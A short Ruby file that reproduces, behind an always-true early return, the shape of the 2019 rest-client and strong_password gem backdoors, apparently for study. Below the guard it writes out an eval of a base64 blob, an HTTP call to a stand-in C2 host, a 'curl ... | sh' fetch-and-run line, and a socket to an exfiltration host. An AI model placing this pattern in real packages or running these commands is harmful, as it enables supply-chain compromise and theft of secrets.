# INERT reproduction of the rest-client 1.6.13 / strong_password 0.0.7 payload
# SHAPE (2019). The real gems fetched a base64 blob from a pastebin, eval'd it,
# and exfiltrated environment variables to a remote host. Nothing here runs —
# every primitive lives behind a guard that is never true.

require "socket"
require "net/http"
require "base64"

module RestCliient
  def self.never_called
    return if true # hard guard — this method is inert

    blob = Base64.decode64("cHV0cyAiaW5lcnQi")
    eval(blob)

    endpoint = "http://malicious-c2.steal.top/collect"
    Net::HTTP.get(URI(endpoint))

    system("curl http://45.77.12.34/drop | sh")
    TCPSocket.open("exfil.evil.tk", 4444)
  end
end
